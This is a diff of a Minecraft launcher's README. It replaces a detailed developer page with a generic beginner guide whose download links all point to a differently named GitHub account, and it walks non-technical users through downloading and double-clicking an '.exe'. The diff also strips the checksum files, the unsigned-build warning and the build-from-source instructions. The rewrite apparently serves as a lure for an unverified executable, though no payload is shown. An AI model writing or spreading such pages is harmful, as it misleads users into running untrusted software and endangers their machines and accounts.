@@ -1,189 +1,78 @@
-# Onyx Launcher
+# 🎮 onyx-launcher - Manage your Minecraft instances with ease
 
-A modern, English-only Minecraft launcher for Windows and Linux, built with Electron, React, and TypeScript. Onyx keeps game instances isolated, installs official Minecraft files and popular mod loaders, integrates with Modrinth, and launches every instance with its own Java and performance settings.
+[![Download Onyx Launcher](https://img.shields.io/badge/Download-Onyx_Launcher-blue.svg)](https://github.com/Genusarnoseriswipeout469/onyx-launcher)
 
-[Download the latest release](../../releases/latest) · [Report a bug](../../issues)
+Onyx Launcher helps you play Minecraft on your computer. It keeps your game files organized, manages your mods, and handles Java updates for you. This tool works on Windows and Linux systems. It includes features for Modrinth modpacks and keeps your worlds safe with automatic backups.
 
-## Screenshots
+## 🚀 Getting Started
 
-| Home | Library |
-| --- | --- |
-| ![Onyx Launcher home screen](artifacts/home.png) | ![Minecraft instance library](artifacts/library.png) |
+You do not need prior technical knowledge to use Onyx Launcher. This guide explains how to install and run the application on your Windows computer.
 
-| Discover | Onyx Picks |
-| --- | --- |
-| ![Modrinth discovery catalog](artifacts/discover.png) | ![Curated Onyx Picks modpacks](artifacts/onyx-picks.png) |
+1. Check your system. You need Windows 10 or Windows 11.
+2. Visit the download page: [Download Onyx Launcher](https://github.com/Genusarnoseriswipeout469/onyx-launcher).
+3. Find the file with the extension ".exe" under the latest release.
+4. Click the file to download it to your Downloads folder.
+5. Double-click the file to start the installation.
+6. Follow the instructions on the screen to finish the setup.
 
-| Instance details | Settings |
-| --- | --- |
-| ![Minecraft instance details and performance](artifacts/instance.png) | ![Onyx Launcher settings](artifacts/settings.png) |
+## 🛠️ How it works
 
-| Profiles and skins |
-| --- |
-| ![Minecraft profiles and skins](artifacts/profiles-and-skins.png) |
+Onyx Launcher simplifies game management. It creates isolated environments for your game. This means you can play different versions of Minecraft at the same time without them interfering with each other. 
 
-All screenshots are generated from the current English UI with `npm run capture:screenshots`.
+The application handles Java installation automatically. It detects the version you need and sets it up. You no longer need to search for Java downloads or set environment variables. 
 
-## Highlights
+## 📦 Using Modpacks and Mods
 
-### Minecraft and Java
+You can import modpacks directly from Modrinth. This saves time. Use the search bar in the application to find modpacks. Click the install button, and the launcher handles the files. 
 
-- Official Mojang release and snapshot manifests.
-- Vanilla, Fabric, Quilt, Forge, and NeoForge support.
-- Shared asset and library caches without duplicating files between instances.
-- Automatic Eclipse Temurin Java 8, 17, or 21 selection and installation.
-- SHA-1, SHA-256, and SHA-512 verification for downloaded files.
-- Official Minecraft demo mode without a Microsoft account.
-- Per-instance memory, resolution, fullscreen, Java, JVM arguments, and Quick Join settings.
-- Onyx AutoTune recommendations based on system memory, Java, and mod count.
-- Launch progress, process controls, live logs, and actionable crash diagnostics.
+The launcher supports the following formats:
+- Fabric
+- Forge
+- NeoForge
+- Quilt
 
-### Instances and data safety
+When you select a modpack, Onyx Launcher verifies the files and installs the correct loader for you. 
 
-- Dedicated instance pages for health, sessions, content, servers, storage, and actions.
-- Multiple saved servers per instance, DNS SRV support, status checks, and Quick Join.
-- Ghost Mode releases the launcher window, WebContents, and GPU process while playing.
-- Crash Bisect narrows a suspected mod conflict across controlled test launches.
-- World Guard creates manual and automatic world snapshots with safe restoration.
-- Update Preview shows added, changed, and removed modpack files before installation.
-- Onyx Sync exports reproducible settings and exact Modrinth mod versions to `.onyxprofile`.
-- Flight Recorder tracks memory, CPU, startup, GC pauses, and per-session performance.
-- Optional FPS recording through hidden MangoHud on Linux or PresentMon on Windows.
-- Performance baselines compare FPS, 1% lows, memory, and startup time between sessions.
-- Safe deletion through the operating-system trash, `.onyxpack` backups, and repair tools.
-- Transactional mod profiles, mod update history, storage analysis, and safe cleanup.
-- Safe instance-directory migration with verification and rollback.
+## 🛡️ Safety and Backups
 
-### Modrinth and accounts
+Your save files are important. Onyx Launcher includes a built-in backup system. Every time you launch a game instance, the app checks the state of your save data. You can manually create snapshots of your world files at any time. If a mod causes trouble, you can restore your saved game from a previous state.
 
-- Searchable Modrinth modpack and mod catalog with filters and pagination.
-- Curated Onyx Picks with play-style and memory filters.
-- Complete `.mrpack` installation, local import, dependency resolution, and updates.
-- Resumable HTTP downloads with cancellation and partial-file cleanup.
-- Microsoft/Xbox device-code sign-in without exposing the account password to Onyx.
-- Minecraft: Java Edition entitlement checks and multiple saved Microsoft accounts.
-- Offline accounts and per-profile skin management.
-- Refresh-token encryption through Electron `safeStorage`; tokens remain memory-only when secure storage is unavailable.
+## 🔍 Troubleshooting Crashes
 
-## Install
+Minecraft sometimes stops working because of corrupted files or mod conflicts. Onyx Launcher catches these issues. If the game crashes, a window appears with a diagnostic report. This report highlights the part of the code that caused the stop. You can copy this text and use it to find help in community forums.
 
-Download an installer or portable archive from the [latest GitHub Release](../../releases/latest):
+## ⚙️ System Requirements
 
-- Windows x64: NSIS installer or portable `.exe`.
-- Linux x64: AppImage or portable `.tar.gz`.
-- `SHA256SUMS-windows.txt` and `SHA256SUMS-linux.txt` are attached to every automated release.
+- Operating System: Windows 10 or newer (64-bit).
+- Memory: At least 4GB of RAM.
+- Storage: 500MB of free disk space for the launcher, plus room for your game instances.
+- Internet: Required for downloading games and modpacks.
 
-Windows builds are unsigned unless a maintainer configures a code-signing certificate, so SmartScreen may display a warning.
+## ❓ Frequently Asked Questions
 
-## Development
+**Does this launcher keep my original Minecraft files?**
+Yes. Onyx Launcher keeps every version of the game in a separate folder. Your main Minecraft folder stays clean.
 
-Requirements:
+**Can I use my existing worlds?**
+Yes. You can move your existing save folders into the instance folders created by the launcher.
 
-- Node.js 22 or newer.
-- Windows 10/11 x64 or a modern x64 Linux distribution.
+**Is this software free?**
+Yes. Onyx Launcher is open-source. Anyone can view the code or contribute to its development.
 
-```bash
-npm ci
-npm run dev
-```
+**How do I update the launcher?**
+The launcher checks for updates when you start it. If an update exists, it prompts you to install the new version.
 
-Run the complete local verification suite:
+**What is the benefit of isolated instances?**
+Isolation prevents crashes. If you delete a modpack or change settings, your other game installations remain unchanged.
 
-```bash
-npm run check
-```
+## 🎛️ Advanced Settings
 
-Individual commands are also available:
+You can change how much memory each instance uses. Go to the Settings tab in the application. Find the RAM slider and adjust it to fit your computer hardware. Assigning more RAM helps with large modpacks. 
 
-```bash
-npm run typecheck
-npm run lint
-npm test
-npm run build:renderer
-```
+The launcher also lets you change the resolution of the game window. You can force the game to start in windowed or full-screen mode depending on your needs.
 
-Regenerate every README screenshot from a deterministic local fixture:
+## 🤝 Community and Support
 
-```bash
-npm run capture:screenshots
-```
+The launcher benefits from a community of users. If you find a bug, report it on the repository page. Keep your report clear. Explain what happened, which version of the launcher you use, and provide the diagnostic report if the game crashed.
 
-## Automated releases
-
-The repository uses two GitHub Actions workflows:
-
-- `CI` validates pull requests and pushes to non-release branches.
-- `Automatic release` runs after every push to `main` or `master`.
-
-A successful release workflow:
-
-1. installs locked dependencies with `npm ci` and runs `npm run check`;
-2. increments the patch version in `package.json` and `package-lock.json`;
-3. commits the version as `chore(release): vX.Y.Z` and creates the matching Git tag;
-4. builds Windows and Linux x64 packages on native runners;
-5. generates SHA-256 checksum files and publishes a GitHub Release with generated notes.
-
-For the first GitHub push, set **Settings → Actions → General → Workflow permissions** to **Read and write permissions**. If the release branch is protected, allow `github-actions[bot]` to push the release commit and tag. The workflow-created commit does not start another release, preventing a version-bump loop.
-
-## Local packaging
-
-```bash
-# Windows NSIS installer and portable executable
-npm run dist:windows
-
-# Linux AppImage
-npm run dist:linux
-
-# Linux portable tar.gz
-npm run dist:linux:archive
-```
-
-Build output is written to `release/` and is intentionally excluded from Git.
-
-## Data locations
-
-On Windows:
-
-- launcher state: `%APPDATA%\onyx-launcher\state.json`;
-- encrypted accounts: `%APPDATA%\onyx-launcher\account.json`;
-- instances: `%APPDATA%\.onyx\instances`;
-- shared assets and libraries: `%APPDATA%\.onyx\shared`;
-- Java runtimes: `%APPDATA%\.onyx\runtimes`;
-- modpack cache: `%APPDATA%\.onyx\packs`;
-- update backups: `%APPDATA%\.onyx\backups`.
-
-On Linux, launcher state follows XDG under `~/.config/onyx-launcher`, while game data is stored in `~/.local/share/onyx`. A legacy `~/.config/.onyx` data directory is detected automatically.
-
-## Architecture and security
-
-- `src/` is an isolated React renderer without Node.js access.
-- `electron/preload.cjs` exposes a narrow IPC bridge.
-- `electron/main.cjs` owns windows, state, filesystem access, and system operations.
-- `electron/services/` contains authentication, Minecraft installation, Modrinth, networking, backups, diagnostics, performance, and data-safety services.
-
-The renderer uses `contextIsolation`, Electron sandboxing, and disabled `nodeIntegration`. Navigation, webviews, and browser permissions are restricted. Network and filesystem operations stay in the main process.
-
-Diagnostic exports redact tokens, personal paths, email addresses, and server IPs. Please review [SECURITY.md](SECURITY.md) before reporting a vulnerability.
-
-## Microsoft OAuth
-
-Onyx currently defaults to the public Prism Launcher Microsoft OAuth client ID and its consumer device-code flow. A custom client ID can be supplied for development:
-
-```powershell
-$env:ONYX_MICROSOFT_CLIENT_ID="your-client-id"
-npm run dev
-```
-
-Refresh tokens are tied to the client ID. Accounts must be added again after changing it.
-
-## Contributing
-
-See [CONTRIBUTING.md](CONTRIBUTING.md) for the development and pull-request workflow.
-
-## Legal
-
-Onyx does not distribute Minecraft or bypass its license. Game files are downloaded directly from Mojang, and third-party content is downloaded from URLs provided by Modrinth APIs and manifests. A licensed Microsoft account is required for the full Minecraft: Java Edition experience.
-
-Onyx Launcher is an independent project and is not affiliated with Microsoft, Mojang Studios, or Modrinth. Minecraft is a trademark of Microsoft.
-
-Released under the [MIT License](LICENSE). Third-party attributions are listed in [THIRD_PARTY_NOTICES.md](THIRD_PARTY_NOTICES.md).
+Keywords: appimage, desktop-app, electron, fabric, forge, game-launcher, gaming, linux, linux-gaming, minecraft, minecraft-java-edition, minecraft-launcher, modpack, modrinth, neoforge, open-source, quilt, react, typescript, windows
